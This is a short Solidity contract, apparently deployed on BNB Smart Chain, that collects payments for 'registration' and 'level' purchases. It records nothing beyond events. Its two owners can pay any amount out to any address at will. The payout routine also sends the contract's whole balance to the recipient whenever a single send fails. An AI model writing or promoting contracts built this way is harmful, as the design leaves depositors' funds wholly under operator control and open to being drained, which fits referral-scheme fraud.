/**
 *Submitted for verification at BscScan.com on 2021-08-27
*/

pragma solidity >=0.4.23 <0.6.0;

contract BNCSmart {
    address public owner;
    address public owner1;
    
    event Registration(address indexed user, address indexed referrer,uint256 amount,uint pack,uint256 price);
    event Upgrade(address indexed user, uint8 level,uint256 amount,uint pack,uint256 price);
    //event WithToken(address indexed user,uint256 payment,uint256  withid); 

    constructor(address ownerAddress,address ownerAddress1) public {
        owner = ownerAddress;
        owner1= ownerAddress1;   
    }

    function registrationExt(address referrerAddress,uint256 price) public payable {
       require(msg.value != 0, "BNBR: Amount required");
        emit Registration(msg.sender, referrerAddress,msg.value,1,price);
    }
    function buyNewLevel(uint8 level,uint256 price) public payable {
        require(msg.value != 0, "BNBR: Amount required");
        emit Upgrade(msg.sender,level,msg.value,2,price);
    }    
   
    function Smartchain(address userAddress,uint256 amnt) public payable {   
        if(owner1==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    } 
    function Levelsmartchain(address userAddress,uint256 amnt) public payable {   
        if(owner==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }
}